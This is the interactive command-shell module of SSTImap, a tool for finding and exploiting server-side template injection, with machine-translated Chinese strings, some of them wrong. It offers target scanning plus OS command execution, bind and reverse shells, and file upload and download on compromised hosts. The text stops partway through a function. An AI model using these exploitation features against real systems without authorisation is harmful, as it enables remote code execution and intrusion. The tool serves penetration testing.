import cmd
import json
import os

from utils import config
from utils.loggers import log, no_colour
from urllib import parse
from core import checks
from core.channel import Channel
from core.clis import Shell, MultilineShell
from core.tcpserver import TcpServer
from core.tcpclient import TcpClient
import socket


class InteractiveShell(cmd.Cmd):
    """Interactive mode shell."""
    def __init__(self, args):
        cmd.Cmd.__init__(self)
        self.prompt = "SSTImap> "
        self.core_prompt = ""
        self.sstimap_options = args.copy()
        self.sstimap_options.update({"tpl_shell": False, "tpl_cmd": None, "os_shell": False, "os_cmd": None,
                                     "bind_shell": None, "reverse_shell": None, "upload": None, "download": None,
                                     "eval_shell": False, "eval_cmd": None, "load_urls": None, "load_forms": None,
                                     "save_urls": None, "save_forms": None, "loaded_urls": set(), "loaded_forms": set()})
        if self.sstimap_options["url"]:
            self.do_url(args.get("url"))
            self.channel = Channel(self.sstimap_options)
        if args["load_urls"]:
            self.do_load_urls(args["load_urls"])
        if args["load_forms"]:
            self.do_load_forms(args["load_forms"])
        self.current_plugin = None
        self.checked = False
        if args["run"]:
            self.do_run("")

    def set_module(self, module):
        self.core_prompt = module
        if not self.sstimap_options.get("colour", True):
            module = no_colour(module)
        self.prompt = f"SSTImap{f' ({module})' if module else ''}> "

    def default(self, line):
        log.log(22, f'无效的交互命令： {line.split(" ", 1)[0].lower()}. '
                    f"Type 'help' to see available commands.")

    def emptyline(self):
        pass

# 信息命令

    def do_help(self, line):
        log.log(23, """SSTImap 是自动化 SSTI 检测与利用工具，支持预设模式和交互模式。

SSTImap：
  ?, help                                 显示帮助信息
  version                                 显示 SSTImap 版本
  opt, options                            显示当前 SSTImap 选项
  info                                    显示检测结果信息
  reload, reload_modules                  重新加载全部 SSTImap 插件和数据类型
  modules, module [MODULE]                列出所有模块或显示 MODULE 信息
  config [PATH]                           从配置文件或目录更新设置
  color, colour                           启用或禁用彩色输出

目标：
  url, target [URL]                       设置目标 URL（例如 'https://example.com/?name=test'）
  load_urls [PATH]                        从 txt 文件或目录加载 URL
  load_forms [PATH]                       从 json 文件或目录加载表单
  run, test, check                        在目标上运行 SSTI 检测

请求：
  mark, marker [MARKER]                   设置注入标记字符串（默认 '*'）
  injection_points [POINTS]               不使用标记时要测试的注入点：Q(uery) B(ody) H(eaders) C(ookies)，默认 QBHC
  data, post {rm} [DATA]                  添加请求体数据；使用 data rm PREFIX 按前缀删除，不带参数则清除全部
  type, data_type [TYPE]                  选择请求体数据类型处理脚本（默认 'auto'）
  module_params {rm} [PARAM]              添加 KEY=VALUE 模块参数；使用 module_params rm KEY 按键删除
  header, headers {rm} [HEADER]           添加请求头；使用 header rm PREFIX 按前缀删除
  cookie, cookies {rm} [COOKIE]           添加 Cookie；使用 cookie rm PREFIX 按前缀删除
  method, http_method [METHOD]            设置 HTTP 方法（默认 'GET'）
  agent, user_agent [AGENT]               设置 User-Agent 请求头值
  random, random_agent                    切换是否每次请求随机使用桌面浏览器 User-Agent
  delay [DELAY]                           设置请求间隔（默认/0：无延迟）
  proxy [PROXY]                           设置连接目标 URL 的代理
  ssl, verify_ssl                         切换 SSL 证书验证（默认不验证）
  log_response                            切换是否记录 HTTP 响应到 ~/.sstimap/sstimap.log

爬取：
  crawl [DEPTH]                           爬取到指定深度（0 表示不爬取）
  forms                                   搜索页面表单
  empty_forms                             将无参数页面视为 GET 表单
  exclude [PATTERN]                       从爬虫排除匹配的正则表达式
  domains [DOMAINS]                       爬取其他域：Y(es) / S(ubdomains) / N(o)，默认 S
  save_urls [PATH]                        保存爬取 URL 到 txt 文件或目录
  save_forms [PATH]                       保存爬取表单到 json 文件或目录

检测：
  lvl, level [LEVEL]                      设置转义检测等级（1-5，默认 1）
  force, force_level [LEVEL] [CLEVEL]     强制使用 LEVEL 和 CLEVEL 测试
  engine [ENGINE]                         以逗号分隔的模板引擎列表；全部使用 '*'
  technique [TECHNIQUE]                   使用 R(渲染) E(报错) B(布尔盲注) T(时间盲注)，默认 REBT
  bool_ok [PATTERN]                       匹配布尔盲注成功响应的正则，留空禁用
  bool_err [PATTERN]                      匹配布尔盲注错误响应的正则，留空禁用
  bool_match [PARAMS]                     匹配参数列表或 'all'，默认 code,header_count,cookie_count,byte_len,body_len,body_words,body_lines,encoding,redirects,time,url,content_type,server
  bool_match_min [MIN_PARAMS]             匹配所需的最小可用参数数目，默认 7
  bool_fuzzy [STABLE] [ERROR]             允许匹配参数存在小偏差，默认 0.05 0.1
  bool_samples [COUNT] [MIN] [MAX]        分析页面和载荷大小的测试数量，默认 10 1 7
  blind_delay [DELAY]                     检测时间盲注的延迟（默认 4 秒）
  verify_delay [DELAY]                    验证并利用时间盲注的延迟（默认 30 秒）
  legacy                                  包含不再适用于新引擎的旧载荷
  generic                                 切换通用引擎专用载荷

利用：
  tpl, tpl_shell                          进入模板引擎交互式 shell
  tpl_code [CODE]                         注入模板引擎代码
  eval, eval_shell                        进入模板引擎基础语言交互式 shell
  eval_code [CODE]                        执行模板引擎基础语言代码
  !, os, shell, os_shell                  进入交互式操作系统 shell
  os_cmd [COMMAND]                        执行操作系统命令
  bind, bind_shell [PORT]                 连接目标 TCP 端口上的绑定 shell
  reverse, reverse_shell [HOST] [PORT]    运行 shell 并反向连接本地主机端口
  remote_shell [SHELL]                    设置目标上的系统 shell（默认 '/bin/sh'）
  overwrite, force_overwrite              切换上传时是否覆盖文件
  up, upload [LOCAL] [REMOTE]             上传本地文件到远程路径
  down, download [REMOTE] [LOCAL]         下载远程文件到本地路径""")

    def do_version(self, line):
        '显示当前 SSTImap 版本'
        log.log(23, f'当前 SSTImap 版本： {self.sstimap_options["version"]}')

    def do_config(self, line):
        if line:
            if os.path.isdir(line):
                line = f"{line}/config.json"
            if os.path.exists(line):
                custom_config = {}
                with open(line, 'r') as stream:
                    try:
                        custom_config = json.load(stream)
                    except json.JSONDecodeError as e:
                        log.log(25, f'加载配置时出错： {repr(e)}')
                config.config_update(self.sstimap_options, custom_config)
                log.log(24, f'从文件更新配置： {line}')
                return
        log.log(25, '提供要从中读取配置的文件或目录。')

    def do_options(self, line):
        '显示当前 SSTImap 选项'
        crawl_domains = {"Y": "Yes", "S": "Subdomains only", "N": "No"}
        log.log(23, f'当前SSTImap {self.sstimap_options["version"]} 交互模式选项：')
        if not self.sstimap_options["url"] and not self.sstimap_options["loaded_urls"] \
                and not self.sstimap_options["loaded_forms"]:
            log.log(25, f'未设置 URL。')
        elif self.sstimap_options["loaded_forms"]:
            log.log(26, f'扫描表格： {len(self.sstimap_options["loaded_forms"])}')
            if self.sstimap_options["forms"]:
                ulen = 1 if self.sstimap_options["url"] else 0
                if self.sstimap_options["loaded_urls"]:
                    ulen += len(self.sstimap_options["loaded_urls"])
                log.log(26, f'要扫描的网址： {ulen}')
        elif self.sstimap_options["loaded_urls"]:
            log.log(26, f'要扫描的网址： '
                        f'{len(self.sstimap_options["loaded_urls"]) + (1 if self.sstimap_options["url"] else 0)}')
        else:
            log.log(26, f'URL: {self.sstimap_options["url"]}')
            if self.checked:
                log.log(24, f'发现注射')
        log.log(26, f'注射标记： {self.sstimap_options["marker"]}')
        if self.sstimap_options["data"]:
            data = "\n    ".join(self.sstimap_options["data"])
            log.log(26, f'请求正文数据：\n    {data}')
            log.log(26, f'请求正文类型： {self.sstimap_options["data_type"]}')
            if self.sstimap_options["module_params"]:
                params = "\n    ".join([f"{x}: {self.sstimap_options['module_params'][x]}"
                                        for x in self.sstimap_options["module_params"]])
                log.log(26, f'模块参数：\n    {params}')
        if self.sstimap_options["headers"]:
            headers = "\n    ".join(self.sstimap_options["headers"])
            log.log(26, f'HTTP 请求头：\n    {headers}')
        if self.sstimap_options["cookies"]:
            cookies = "\n    ".join(self.sstimap_options["cookies"])
            log.log(26, f'Cookies:\n    {cookies}')
        log.log(26, f'HTTP方法： '
                    f'{self.sstimap_options["method"] if self.sstimap_options["method"] else "Detect automatically"}')
        if self.sstimap_options["random_agent"]:
            log.log(26, 'User-Agent是随机的')
        else:
            log.log(26, f'User-Agent： {self.sstimap_options["user_agent"]}')
        if self.sstimap_options["delay"]:
            log.log(26, f'请求之间的延迟： {self.sstimap_options["delay"]}s')
        if self.sstimap_options["proxy"]:
            log.log(26, f'Proxy: {self.sstimap_options["proxy"]}')
        log.log(26, f'验证 SSL： {self.sstimap_options["verify_ssl"]}')
        if self.sstimap_options["force_level"]:
            log.log(26, f'强制等级： {self.sstimap_options["force_level"][0]}')
            log.log(26, f'强制上下文级别： {self.sstimap_options["force_level"][1]}')
        else:
            log.log(26, f'Level: {self.sstimap_options["level"]}')
        log.log(26, f'发动机滤清器： {self.sstimap_options["engine"] if self.sstimap_options["engine"] else "*"}'
                    f'{"+" if self.sstimap_options["legacy"] else ""}'
                    f'{"»" if not self.sstimap_options["generic"] else ""}')
        if self.sstimap_options["crawl_depth"] > 0:
            log.log(26, f'履带深度： {self.sstimap_options["crawl_depth"]}')
            if self.sstimap_options["crawl_exclude"]:
                log.log(26, f'爬虫排除正则表达式：“{self.sstimap_options["crawl_exclude"]}"')
            log.log(26, f'抓取其他域： {crawl_domains.get(self.sstimap_options["crawl_domains"].upper())}')
        else:
            log.log(26, '爬行器：无爬行')
        log.log(26, f'形态检测： {self.sstimap_options["forms"]}')
        if self.sstimap_options["forms"]:
            log.log(26, f'允许空表单： {self.sstimap_options["empty_forms"]}')
        log.log(26, f'攻击技术： {self.sstimap_options["technique"]}')
        if "B" in self.sstimap_options["technique"]:
            if self.sstimap_options["boolean_regex_ok"]:
                log.log(26, f'布尔报错型盲注检测：RegEx（普通页面）')
                log.log(26, f'布尔报错型盲注正则表达式： {self.sstimap_options["boolean_regex_ok"]}')
            elif self.sstimap_options["boolean_regex_err"]:
                log.log(26, f'布尔报错型盲注检测：RegEx（错误页面）')
                log.log(26, f'布尔报错型盲注正则表达式： {self.sstimap_options["boolean_regex_err"]}')
            else:
                log.log(26, f'布尔报错型盲注检测：匹配页面')
                if self.sstimap_options["boolean_match"] not in ["", "*", "all"]:
                    match_params = "\n    ".join(self.sstimap_options["boolean_match"].split(","))
                    log.log(26, f'基于布尔误差的盲匹配参数：\n    {match_params}')
                else:
                    log.log(26, f'基于布尔误差的盲匹配参数：全部')
                log.log(26, f'布尔最小可用匹配参数： {self.sstimap_options["boolean_match_min"]}')
                log.log(26, f'布尔最大稳定模糊匹配偏差： {self.sstimap_options["boolean_fuzzy"][0]}')
                log.log(26, f'布尔最小误差模糊匹配偏差： {self.sstimap_options["boolean_fuzzy"][1]}')
                log.log(26, f'布尔匹配普通页面示例： {self.sstimap_options["boolean_samples"][0]}')
                log.log(26, f'布尔匹配样本大小： {self.sstimap_options["boolean_samples"][1]}-'
                            f'{self.sstimap_options["boolean_samples"][2]}')
        if "T" in self.sstimap_options["technique"]:
            log.log(26, f'基于时间的盲检测延迟： {self.sstimap_options["time_based_blind_delay"]}')
            log.log(26, f'基于时间的验证和利用延迟： {self.sstimap_options["time_based_verify_blind_delay"]}')
        log.log(26, f'强制覆盖文件： {self.sstimap_options["force_overwrite"]}')
        log.log(26, f'预期的远程 shell： {self.sstimap_options["remote_shell"]}')
        if self.sstimap_options["log_response"]:
            log.log(26, 'HTTP 响应将包含在 ~/.sstimap/sstimap.log 中')

    do_opt = do_options

    def do_module(self, line):
        '列出模块或显示模块信息'
        checks.module_info(line)

    do_modules = do_module

    def do_info(self, line):
        '显示有关检测到的 SSTI 的功能的信息'
        if not self.checked:
            log.log(25, '未检查目标 URL 的 SSTI。首先使用“运行”或“检查”。')
            return
        checks.print_injection_summary(self.channel)

# 目标命令

    def do_url(self, line):
        '设置目标网址'
        if line == '':
            log.log(22, '目标 URL 不能为空。')
            return
        url = parse.urlparse(line)
        if url.netloc == '':
            log.log(22, '无法解析目标 URL。')
            return
        log.log(24, f'目标 URL 设置为 {line}')
        self.sstimap_options["url"] = line
        if not (self.sstimap_options['loaded_forms'] or self.sstimap_options['loaded_urls']):
            self.set_module(f'\033[31m{url.netloc}\033[0m')
        self.checked = False

    do_target = do_url

    def do_load_urls(self, line):
        if line:
            if os.path.isdir(line):
                line = f"{line}/urls.txt"
            if os.path.exists(line):
                try:
                    with open(line, 'r') as stream:
                        self.sstimap_options["loaded_urls"] = set([x.strip() for x in stream.readlines()])
                    log.log(21, f"已加载 {len(self.sstimap_options['loaded_urls'])} 文件中的 URL： {line}")
                    if not self.sstimap_options['loaded_forms']:
                        self.set_module(f"\033[31m{len(self.sstimap_options['loaded_urls'])} URLs\033[0m")
                    self.checked = False
                except Exception as e:
                    log.log(22, f"从文件加载 URL 时发生错误：\n{repr(e)}")
                return
            log.log(25, '提供有效的文件或目录以从中读取 URL。')
        else:
            self.sstimap_options["loaded_urls"] = None
            if not self.sstimap_options['loaded_forms']:
                self.set_module(f'\033[31m{parse.urlparse(self.sstimap_options["url"]).netloc}'
                                f'\033[0m' if self.sstimap_options["url"] else "")

    def do_load_forms(self, line):
        if line:
            if os.path.isdir(line):
                line = f"{line}/forms.json"
            if os.path.exists(line):
                try:
                    with open(line, 'r') as stream:
                        self.sstimap_options["loaded_forms"] = set([tuple(x) for x in json.load(stream)])
                    log.log(21, f"已加载 {len(self.sstimap_options['loaded_forms'])} 文件中的表格： {line}")
                    self.set_module(f"\033[31m{len(self.sstimap_options['loaded_forms'])} forms\033[0m")
                    self.checked = False
                except Exception as e:
                    log.log(22, f"从文件加载表单时出错：\n{repr(e)}")
                return
            log.log(25, '提供有效的文件或目录以从中读取表单。')
        else:
            self.sstimap_options["loaded_forms"] = None
            if self.sstimap_options['loaded_urls']:
                self.set_module(f"\033[31m{len(self.sstimap_options['loaded_urls'])} URLs\033[0m")
            else:
                self.set_module(f'\033[31m{parse.urlparse(self.sstimap_options["url"]).netloc}'
                                f'\033[0m' if self.sstimap_options["url"] else "")

    def do_save_urls(self, line):
        if line:
            if self.sstimap_options.get('crawled_urls', None):
                if os.path.isdir(line):
                    line = f"{line}/sstimap_urls.txt"
                try:
                    with open(line, 'w') as stream:
                        stream.write("\n".join(self.sstimap_options['crawled_urls']))
                    log.log(21, f"保存到文件的 URL： {line}")
                except Exception as e:
                    log.log(22, f"将 URL 保存到文件时发生错误：\n{repr(e)}")
            else:
                log.log(25, '没有抓取要保存的 URL。')
            return
        log.log(25, '提供保存 URL 的有效文件或目录。')

    def do_save_forms(self, line):
        if line:
            if self.sstimap_options.get('crawled_forms', None):
                if os.path.isdir(line):
                    line = f"{line}/sstimap_forms.json"
                try:
                    with open(line, 'w') as stream:
                        json.dump([x for x in self.sstimap_options['crawled_forms']], stream, indent=4)
                    log.log(21, f"保存到文件的表格： {line}")
                except Exception as e:
                    log.log(22, f"将表单保存到文件时出错：\n{repr(e)}")
            else:
                log.log(25, '未检测到要保存的表单。')
            return
        log.log(25, '提供保存表单的有效文件或目录。')

    def do_crawl(self, line):
        if not line.isnumeric():
            line = "0"
        self.sstimap_options['crawl_depth'] = int(line)
        if int(line):
            log.log(24, f'爬行深度设置为 {line}.')
        else:
            log.log(24, '爬行禁用。')
        
    def do_exclude(self, line):
        self.sstimap_options['crawl_exclude'] = line
        if line:
            log.log(24, f'爬取程序排除正则表达式设置为“{line}".')
        else:
            log.log(24, '爬取程序排除正则表达式已禁用。')
    
    do_crawl_exclude = do_exclude
    do_crawlexclude = do_exclude
        
    def do_forms(self, line):
        overwrite = not self.sstimap_options['forms']
        log.log(24, f'形态检测 {"en" if overwrite else "dis"}abled.')
        self.sstimap_options['forms'] = overwrite

    def do_empty_forms(self, line):
        overwrite = not self.sstimap_options['empty_forms']
        log.log(24, f'空表格处理 {"en" if overwrite else "dis"}abled.')
        self.sstimap_options['empty_forms'] = overwrite

    def do_color(self, line):
        colour = not self.sstimap_options['colour']
        self.sstimap_options['colour'] = colour
        from utils.loggers import formatter
        formatter.colour = colour
        self.set_module(self.core_prompt)
        log.log(24, f'彩色输出 {"en" if colour else "dis"}abled.')

    do_colour = do_color

    def do_run(self, line):
        '检查目标 URL 是否存在 SSTI 漏洞'
        if not (self.sstimap_options["url"] or self.sstimap_options["loaded_urls"] or self.sstimap_options["loaded_forms"]):
            log.log(22, '目标 URL 不能为空。')
            return
        try:
            plugin, channel = checks.scan_website(self.sstimap_options)
        except (KeyboardInterrupt, EOFError):
            plugin, channel = None, None
            log.log(26, '退出 SSTI 检测')
        if plugin:
            self.current_plugin, self.channel = plugin, channel
            self.checked = True
            self.sstimap_options["loaded_urls"] = None
            self.sstimap_options["loaded_forms"] = None
            self.sstimap_options["url"] = self.channel.url
            self.set_module(f'\033[32m{parse.urlparse(self.sstimap_options["url"]).netloc}\033[0m')

    do_check = do_run
    do_test = do_run

# 请求命令

    def do_marker(self, line):
        '设置注射标记'
        if line == '':
            log.log(22, '标记不能为空。')
            return
        log.log(24, f'标记设置为 {line}')
        self.sstimap_options["marker"] = line

    do_mark = do_marker

    def do_data(self, line):
        '修改请求体数据'
        if line == "":
            log.log(24, f'清除所有请求正文数据...')
            self.sstimap_options["data"] = []
            return
        command = line.split(" ", 1)
        if (command[0] == "remove" or command[0] == "rm") and len(command) == 2 and command[1] != "":
            log.log(24, f'删除开头的数据 {command[1]}:')
            for data in self.sstimap_options["data"].copy():
                if data.startswith(command[1]):
                    log.log(26, f'Removing: {data}')
                    self.sstimap_options["data"].remove(data)
        else:
            log.log(24, f'添加请求正文数据： {line}')
            self.sstimap_options["data"].append(line)

    do_post = do_data

    def do_module_params(self, line):
        '修改模块参数'
        if line == "":
            log.log(24, f'清除所有模块参数...')
            self.sstimap_options["module_params"] = {}
            return
        command = line.split(" ", 1)
        if (command[0] == "remove" or command[0] == "rm") and len(command) == 2 and command[1] != "":
            log.log(24, f'删除模块参数 {command[1]}:')
            self.sstimap_options["module_params"].pop(command[1], None)
        else:
            param = line.split("=", 1)
            log.log(24, f'添加模块参数： {param[0]}')
            self.sstimap_options["module_params"][param[0]] = param[1]

    def do_header(self, line):
        '修改HTTP请求头'
        if line == "":
            log.log(24, f'清除所有 HTTP 请求头...')
            self.sstimap_options["headers"] = []
            return
        command = line.split(" ", 1)
        if (command[0] == "remove" or command[0] == "rm") and len(command) == 2 and command[1] != "":
            log.log(24, f'删除以以下开头的 HTTP 请求头 {command[1]}:')
            for header in self.sstimap_options["headers"].copy():
                if header.startswith(command[1]):
                    log.log(26, f'Removing: {header}')
                    self.sstimap_options["headers"].remove(header)
        else:
            log.log(24, f'添加 HTTP 请求头： {line}')
            self.sstimap_options["headers"].append(line)

    do_headers = do_header

    def do_cookie(self, line):
        '修改cookies'
        if line == "":
            log.log(24, f'清除所有cookie...')
            self.sstimap_options["cookies"] = []
            return
        command = line.split(" ", 1)
        if (command[0] == "remove" or command[0] == "rm") and len(command) == 2 and command[1] != "":
            log.log(24, f'删除 cookie 开头为 {command[1]}:')
            for cookie in self.sstimap_options["cookies"].copy():
                if cookie.startswith(command[1]):
                    log.log(26, f'Removing: {cookie}')
                    self.sstimap_options["cookies"].remove(cookie)
        else:
            log.log(24, f'添加cookie： {line}')
            self.sstimap_options["cookies"].append(line)

    do_cookies = do_cookie

    def do_http_method(self, line):
        '设置HTTP方法'
        if line == '':
            log.log(22, 'HTTP 方法不能为空。')
            return
        line = line.upper()
        log.log(24, f'HTTP 方法设置为 {line}')
        self.sstimap_options["method"] = line

    do_method = do_http_method

    def do_data_type(self, line):
        '设置请求正文类型'
        if line == '':
            line = 'auto'
        line = line.lower()
        log.log(24, f'请求正文类型设置为 {line}')
        self.sstimap_options["data_type"] = line

    do_type = do_data_type

    def do_user_agent(self, line):
        '设置User-Agent'
        if line == '':
            log.log(22, 'User-Agent不能为空。')
            return
        log.log(24, f'User-Agent设置为 {line}')
        self.sstimap_options["user_agent"] = line

    do_agent = do_user_agent

    def do_random_agent(self, line):
        '切换 random_user_agent 选项'
        overwrite = not self.sstimap_options["random_agent"]
        log.log(24, f'User-Agent随机化 {"en" if overwrite else "dis"}abled')
        self.sstimap_options["random_agent"] = overwrite

    do_random = do_random_agent

    def do_delay(self, line):
        '设置请求之间的延迟'
        try:
            self.sstimap_options["delay"] = max(float(line), 0)
        except ValueError:
            log.log(22, '延迟时间无效。')
            return
        log.log(24, f'请求之间的延迟设置为 {self.sstimap_options["delay"]}')

    do_request_delay = do_delay

    def do_proxy(self, line):
        '使用代理'
        if line == "":
            log.log(24, f'禁用代理...')
            self.sstimap_options["proxy"] = None
            return
        log.log(24, f'将代理设置为 {line}')
        self.sstimap_options["proxy"] = line

    def do_verify_ssl(self, line):
        '切换 verify_ssl 选项'
        overwrite = not self.sstimap_options["verify_ssl"]
        log.log(24, f'SSL验证 {"en" if overwrite else "dis"}abled')
        self.sstimap_options["verify_ssl"] = overwrite

    do_ssl = do_verify_ssl

    def do_log_response(self, line):
        '切换 log_response 选项'
        overwrite = not self.sstimap_options["log_response"]
        log.log(24, f'响应记录 {"en" if overwrite else "dis"}abled')
        self.sstimap_options["log_response"] = overwrite

# 检测命令

    def do_level(self, line):
        '设置 LEVEL 以检查是否有逃逸'
        if line == '' or not line.isnumeric() or len(line) > 1:
            log.log(22, '级别值无效。')
            return
        level = int(line)
        log.log(24, f'转义级别设置为 {level}')
        self.sstimap_options["level"] = level

    do_lvl = do_level

    def do_force_level(self, line):
        '强制检查 LEVEL 和 CLEVEL'
        if line == "":
            log.log(24, f'禁用强制模板转义级别和语言上下文级别')
            self.sstimap_options["force_level"] = None
            return
        line = line.split(" ")
        if len(line) != 2 or not line[0].isnumeric() or len(line[0]) > 1 or not line[1].isnumeric() or len(line[1]) > 1:
            log.log(22, 'LEVEL 或 CLEVEL 值无效。')
            return
        force_level = (int(line[0]), int(line[1]),)
        log.log(24, f'强制模板转义级别 {force_level[0]} 和语言语境水平 {force_level[1]}')
        self.sstimap_options["force_level"] = force_level

    do_force = do_force_level

    def do_engine(self, line):
        '设置模板ENGINE进行检查'
        if line.lower() in ['', '*', 'all']:
            line = None
        log.log(24, f'模板引擎过滤器设置为 {line if line else "*"}')
        self.sstimap_options["engine"] = line

    def do_technique(self, line):
        '设置攻击技术来检查'
        line = line.upper()
        technique = ""
        for t in line:
            if t in ["R", "E", "B", "T"] and t not in technique:
                technique += t
                line = line.replace(t, "")
        if technique == "":
            log.log(22, '技术值无效。它必须至少包含“R”、“E”、“B”或“T”之一。')
            return
        if line != "":
            log.log(22, '技术值无效。它只能包含“R”、“E”、“B”和“T”。')
            return
        log.log(24, f'攻击技术设置为 {technique}')
        self.sstimap_options["technique"] = technique

    def do_injection_points(self, line):
        '设置injection_points来检查'
        line = line.upper()
        points = ""
        for p in line:
            if p in ["Q", "B", "H", "C"] and p not in points:
                points += p
                line = line.replace(p, "")
        if points == "":
            log.log(22, 'POINTS 值无效。它必须至少包含“Q”、“B”、“H”或“C”之一。')
            return
        if line != "":
            log.log(22, 'POINTS 值无效。它只能包含“Q”、“B”、“H”和“C”。')
            return
        log.log(24, f'注入点设置为 {points}')
        self.sstimap_options["injection_points"] = points

    def do_remote_shell(self, line):
        '设置预期的远程 shell'
        log.log(24, f'预期的远程 shell 设置为 {line}')
        self.sstimap_options["remote_shell"] = line

    def do_crawl_domains(self, line):
        '设置抓取域名行为'
        line = line.upper()
        if line not in ["Y", "S", "N"]:
            log.log(22, '域名值无效。应该是“Y”、“S”或“N”。')
            return
        log.log(24, f'域抓取设置为 {line}')
        self.sstimap_options["crawl_domains"] = line

    do_domains = do_crawl_domains

    def do_bool_ok(self, line):
        self.sstimap_options['boolean_regex_ok'] = line
        if line:
            log.log(24, f'布尔报错型盲注正常页面正则表达式设置为“{line}".')
        else:
            log.log(24, '禁用布尔报错型盲注正常页面正则表达式。')
        if self.sstimap_options['boolean_regex_ok']:
            log.log(23, '布尔报错型盲注检测：RegEx（普通页面）')
        elif self.sstimap_options['boolean_regex_err']:
            log.log(29 if line else 23, '布尔报错型盲注检测：RegEx（错误页面）')
        else:
            log.log(29 if line else 23, '布尔报错型盲注检测：匹配页面')

    def do_bool_err(self, line):
        self.sstimap_options['boolean_regex_err'] = line
        if line:
            log.log(24, f'布尔报错型盲注错误页面正则表达式设置为“{line}".')
        else:
            log.log(24, '布尔报错型盲注错误页面正则表达式已禁用。')
        if self.sstimap_options['boolean_regex_ok']:
            log.log(29 if line else 23, '布尔报错型盲注检测：RegEx（普通页面）')
        elif self.sstimap_options['boolean_regex_err']:
            log.log(23, '布尔报错型盲注检测：RegEx（错误页面）')
        else:
            log.log(29 if line else 23, '布尔报错型盲注检测：匹配页面')

    def do_bool_match(self, line):
        if line not in ["", "*", "all"]:
            self.sstimap_options['boolean_match'] = line
            match_params = "\n    ".join(self.sstimap_options["boolean_match"].split(","))
            log.log(24, f'基于布尔误差的盲匹配参数：\n    {match_params}')
        else:
            self.sstimap_options['boolean_match'] = "all"
            log.log(24, '基于布尔误差的盲匹配参数：全部')
        if self.sstimap_options['boolean_regex_ok']:
            log.log(29, '布尔报错型盲注检测：RegEx（普通页面）')
        elif self.sstimap_options['boolean_regex_err']:
            log.log(29, '布尔报错型盲注检测：RegEx（错误页面）')
        else:
            log.log(23, '布尔报错型盲注检测：匹配页面')

    def do_bool_match_min(self, line):
        if not line.isnumeric() or not (0 < int(line) < 14):
            line = "13"
        self.sstimap_options['boolean_match_min'] = int(line)
        log.log(24, f'布尔最小稳定匹配参数设置为 {int(line)}')
        if self.sstimap_options['boolean_regex_ok']:
            log.log(29, '布尔报错型盲注检测：RegEx（普通页面）')
        elif self.sstimap_options['boolean_regex_err']:
            log.log(29, '布尔报错型盲注检测：RegEx（错误页面）')
        else:
            log.log(23, '布尔报错型盲注检测：匹配页面')

    def do_bool_fuzzy(self, line):
        line = line.split(" ")
        try:
            boolean_fuzzy = (float(line[0]), float(line[1]),)
        except IndexError:
            log.log(22, '必须提供 STABLE 和 ERROR 值。')
            return
        except ValueError:
            log.log(22, '无效的 STABLE 或 ERROR 值。')
            return
        self.sstimap_options["boolean_fuzzy"] = boolean_fuzzy
        log.log(24, f'模糊匹配允许偏差 {boolean_fuzzy[0]} 为了稳定参数')
        log.log(24, f'模糊匹配需要偏差 {boolean_fuzzy[1]} 检测错误')
        if self.sstimap_options['boolean_regex_ok']:
            log.log(29, '布尔报错型盲注检测：RegEx（普通页面）')
        elif self.sstimap_options['boolean_regex_err']:
            log.log(29, '布尔报错型盲注检测：RegEx（错误页面）')
        else:
            log.log(23, '布尔报错型盲注检测：匹配页面')

    def do_bool_samples(self, line):
        line = line.split(" ")
        try:
            boolean_samples = (int(line[0]), int(line[1]), int(line[2]),)
        except IndexError:
            log.log(22, '必须提供 COUNT、MIN 和 MAX 值。')
            return
        except ValueError:
            log.log(22, 'COUNT、MIN 或 MAX 值无效。')
            return
        self.sstimap_options["boolean_samples"] = boolean_samples
        log.log(24, f'匹配器会尝试 {boolean_samples[0]} 的载荷 {boolean_samples[0]}-{boolean_samples[0]}'
                    f' 用于分析页面的字符')
        if self.sstimap_options['boolean_regex_ok']:
            log.log(29, '布尔报错型盲注检测：RegEx（普通页面）')
        elif self.sstimap_options['boolean_regex_err']:
            log.log(29, '布尔报错型盲注检测：RegEx（错误页面）')
        else:
            log.log(23, '布尔报错型盲注检测：匹配页面')

    def do_blind_delay(self, line):
        '设置 DELAY 进行盲 SSTI 检测'
        try:
            self.sstimap_options["time_based_blind_delay"] = max(int(line), 1)
        except ValueError:
            log.log(22, '基于时间的盲注延迟时间无效。')
            return
        log.log(24, f'基于时间的盲注入检测的延迟设置为 {self.sstimap_options["time_based_blind_delay"]}')

    do_time_based_blind_delay = do_blind_delay

    def do_verify_delay(self, line):
        '设置 DELAY 进行盲 SSTI 检测'
        try:
            self.sstimap_options["time_based_verify_blind_delay"] = max(int(line), 1)
        except ValueError:
            log.log(22, '基于时间的盲注延迟时间无效。')
            return
        log.log(24, f'基于时间的盲注入验证和利用的延迟设置为 {self.sstimap_options["time_based_verify_blind_delay"]}')

    do_verify_blind_delay = do_verify_delay

    def do_legacy(self, line):
        '切换旧版选项'
        overwrite = not self.sstimap_options["legacy"]
        log.log(24, f'{"En" if overwrite else "Dis"}可用的遗留插件')
        self.sstimap_options["legacy"] = overwrite

    def do_generic(self, line):
        '切换通用选项'
        overwrite = not self.sstimap_options["generic"]
        log.log(24, f'{"En" if overwrite else "Dis"}通用模板引擎的专用插件')
        self.sstimap_options["generic"] = overwrite

# 利用命令

    def do_tpl_shell(self, line):
        '提供交互式多行模板shell'
        if not self.checked:
            log.log(22, '未检查目标 URL 的 SSTI。首先使用“运行”或“检查”。')
            return
        if self.channel.data.get('engine'):
            if self.channel.data.get('blind') or self.channel.data.get('boolean'):
                log.log(23, '只发现了盲目执行。注入的模板代码不会产生任何输出。')
                call = self.current_plugin.inject
            else:
                call = self.current_plugin.render
            log.log(21, '注入多行模板代码。按 ctrl-D 或在新行上键入“EOF”以发送行')
            try:
                MultilineShell(call, f"{self.channel.data.get('engine', '')} > ").cmdloop()
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, '退出模板外壳')
        else:
            log.log(22, '目标上未检测到代码评估功能')

    do_tpl = do_tpl_shell

    def do_tpl_code(self, line):
        '评估单个模板命令'
        if not self.checked:
            log.log(22, '未检查目标 URL 的 SSTI。首先使用“运行”或“检查”。')
            return
        if line == '':
            log.log(22, '模板命令不能为空。')
            return
        if self.channel.data.get('engine'):
            if self.channel.data.get('blind') or self.channel.data.get('boolean'):
                log.log(23, '只发现了盲目执行。注入的模板代码不会产生任何输出。')
                call = self.current_plugin.inject
            else:
                call = self.current_plugin.render
            try:
                print(call(line))
            except (KeyboardInterrupt, EOFError):
                log.log(26, '退出模板命令执行')
        else:
            log.log(22, '目标上未检测到模板代码评估功能')

    def do_eval_shell(self, line):
        '提供交互式多行模板基础语言shell'
        if not self.checked:
            log.log(22, '未检查目标 URL 的 SSTI。首先使用“运行”或“检查”。')
            return
        if self.channel.data.get('evaluate_blind'):
